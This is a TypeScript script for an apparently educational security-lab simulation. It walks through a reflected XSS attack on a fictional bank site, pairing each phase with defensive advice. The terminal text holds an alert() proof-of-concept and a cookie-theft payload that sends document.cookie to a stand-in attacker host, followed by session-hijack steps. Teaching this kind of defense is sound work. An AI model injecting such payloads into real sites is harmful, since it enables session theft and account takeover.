import { ScenarioScript } from '../lab-engine';

export const xssploitScript: ScenarioScript = {
    id: 'xss-01',

    victimScreens: [
        { id: 'browser-normal',  type: 'browser', url: 'https://corpbank.com/search',  content: 'BROWSER_NORMAL' },
        { id: 'input-testing',   type: 'browser', url: 'https://corpbank.com/search',  content: 'INPUT_TESTING' },
        { id: 'alert-popup',     type: 'browser', url: 'https://corpbank.com/search',  content: 'ALERT_POPUP' },
        { id: 'cookie-stolen',   type: 'browser', url: 'https://corpbank.com/search',  content: 'COOKIE_STOLEN' },
        { id: 'compromised',     type: 'result',  url: 'https://corpbank.com',         content: 'COMPROMISED' },
    ],

    phases: [
        // ── PHASE 1 — RECON ───────────────────────────────────────────────
        {
            id: 'recon',
            name: 'RECONNAISSANCE',
            autoPlay: true,
            progressPct: 15,
            victimScreen: 'browser-normal',
            terminalLines: [
                { text: '══════════════════════════════════════', type: 'dim',     delay: 0 },
                { text: '  ATTACKER TERMINAL — XSS-Ploit',      type: 'dim',     delay: 100 },
                { text: '══════════════════════════════════════', type: 'dim',     delay: 200 },
                { text: '',                                      type: 'dim',     delay: 300 },
                { text: 'nmap -sV corpbank.com',                 type: 'command', delay: 500 },
                { text: '[+] 443/tcp open https',               type: 'success', delay: 1300 },
                { text: '[*] Web application detected',          type: 'info',    delay: 1800 },
                { text: '[*] Scanning for XSS vulnerabilities...', type: 'info', delay: 2300 },
                { text: '',                                      type: 'dim',     delay: 2800 },
                { text: 'python3 xss_scanner.py --url corpbank.com', type: 'command', delay: 3100 },
                { text: '[*] Testing input fields...',           type: 'info',    delay: 3900 },
                { text: '[*] Testing: search field',             type: 'info',    delay: 4400 },
                { text: '[*] Testing: comment field',            type: 'info',    delay: 4800 },
                { text: '[*] Testing: username field',           type: 'info',    delay: 5200 },
                { text: '[+] REFLECTED XSS found in search field!', type: 'success', delay: 5800, trigger: 'input-testing' },
                { text: '[+] Input reflected without sanitisation', type: 'success', delay: 6300 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker found a search field that reflects whatever you type directly back into the page without sanitising it. This means JavaScript code typed into the search bar will execute in the victim browser.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'A vulnerable input field was found on your site. Any field that reflects user input must sanitise it before displaying. Never trust user input — always encode output to prevent script injection.',
                },
            ],
        },

        // ── PHASE 2 — POC TEST ────────────────────────────────────────────
        {
            id: 'poc-test',
            name: 'XSS PROOF OF CONCEPT',
            autoPlay: false,
            progressPct: 35,
            victimScreen: 'input-testing',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[*] Testing proof of concept payload...', type: 'info', delay: 300 },
                { text: "[*] Injecting: <script>alert('XSS')</script>", type: 'data', delay: 800 },
                { text: '[*] Submitting to search field...',     type: 'info',    delay: 1400 },
                { text: '[+] Script executed in victim browser!', type: 'success', delay: 2000, trigger: 'alert-popup' },
                { text: '[+] Alert popup appeared!',             type: 'success', delay: 2400 },
                { text: '[+] XSS vulnerability CONFIRMED',       type: 'success', delay: 2900 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The basic alert payload confirmed the vulnerability. If the browser executes alert() it will execute anything — including code that steals cookies, redirects users or logs keystrokes silently.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'JavaScript is executing from user input. Content Security Policy headers would have blocked this script from running entirely. CSP is a one line server configuration that prevents XSS attacks.',
                },
            ],
            decisionPoint: {
                id: 'poc-decision',
                question: 'A popup appeared on the CorpBank website unexpectedly. What does this mean?',
                description: 'Full attack plays out to show how XSS leads to session theft.',
                choices: [
                    { label: '⚠ Something is wrong — close the tab', safe: true,  consequence: 'Good instinct — unexpected popups often indicate XSS attacks' },
                    { label: '🤷 Probably just an annoying ad',        safe: false, consequence: 'This was not an ad — it was proof that malicious code is executing' },
                ],
            },
            nextPhase: 'cookie-theft',
        },

        // ── PHASE 3 — COOKIE THEFT ────────────────────────────────────────
        {
            id: 'cookie-theft',
            name: 'SESSION COOKIE STOLEN',
            autoPlay: true,
            progressPct: 60,
            victimScreen: 'alert-popup',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[*] Upgrading to cookie theft payload...', type: 'info', delay: 300 },
                { text: "[*] Injecting:",                        type: 'info',    delay: 800 },
                { text: "    <script>",                          type: 'data',    delay: 1100 },
                { text: "      fetch('http://attacker.com/steal?c='",  type: 'data', delay: 1300 },
                { text: "      +document.cookie)",               type: 'data',    delay: 1500 },
                { text: "    </script>",                         type: 'data',    delay: 1700 },
                { text: '[*] Victim loaded the page...',         type: 'info',    delay: 2200, trigger: 'cookie-stolen' },
                { text: '[+] Cookie received at attacker server!', type: 'success', delay: 2800 },
                { text: '[+] PHPSESSID=abc123def456xyz789',      type: 'data',    delay: 3200 },
                { text: '[+] Session token captured!',           type: 'success', delay: 3700 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The cookie theft payload sent your session token to the attacker server automatically when you loaded the page. You saw nothing. The HttpOnly flag on cookies prevents JavaScript from reading them — stopping this attack completely.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'Your session cookie has been stolen. The attacker can now use this token to log in as you without needing your password. Log out of all sessions immediately and change your password.',
                },
            ],
        },

        // ── PHASE 4 — SESSION REPLAY ──────────────────────────────────────
        {
            id: 'session-replay',
            name: 'SESSION HIJACKED',
            autoPlay: true,
            progressPct: 85,
            victimScreen: 'cookie-stolen',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[*] Injecting stolen cookie into browser...', type: 'info', delay: 300 },
                { text: '[+] Cookie replaced successfully',      type: 'success', delay: 900 },
                { text: '[*] Refreshing page...',                type: 'info',    delay: 1400 },
                { text: '[+] LOGGED IN AS VICTIM!',              type: 'success', delay: 2000 },
                { text: '[+] No password required',              type: 'data',    delay: 2400 },
                { text: '[+] Full account access granted',       type: 'success', delay: 2800 },
                { text: '[*] Accessing account settings...',     type: 'info',    delay: 3300 },
                { text: '[*] Changing email address...',         type: 'info',    delay: 3900 },
                { text: '[+] Account fully taken over',          type: 'error',   delay: 4600 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker pasted your stolen session cookie into their browser and refreshed the page. The server accepted it as valid — they are now logged in as you without ever knowing your password.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'XSS prevention: add Content Security Policy headers, set HttpOnly flag on all cookies, sanitise all user input before rendering, use modern frameworks that escape output automatically like React or Vue.',
                },
            ],
            nextPhase: 'compromised',
        },

        // ── PHASE 5 — COMPROMISED ─────────────────────────────────────────
        {
            id: 'compromised',
            name: 'ATTACK COMPLETE',
            autoPlay: true,
            progressPct: 100,
            victimScreen: 'compromised',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[+] ATTACK COMPLETE',                   type: 'error',   delay: 300 },
                { text: '[+] Session stolen via XSS',            type: 'data',    delay: 700 },
                { text: '[+] Account email changed',             type: 'data',    delay: 1000 },
                { text: '[+] Password reset link sent to attacker', type: 'data', delay: 1300 },
                { text: '[+] Account fully locked out',          type: 'error',   delay: 1700 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'XSS is the most common web vulnerability. The 2014 eBay XSS attack redirected millions of buyers to fake payment pages. React and Vue frameworks prevent XSS automatically by escaping all output by default.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'Future prevention: implement strict CSP headers, HttpOnly and Secure flags on cookies, sanitise all user generated content, use modern frameworks, run regular security scans with tools like OWASP ZAP.',
                },
            ],
        },
    ],
};
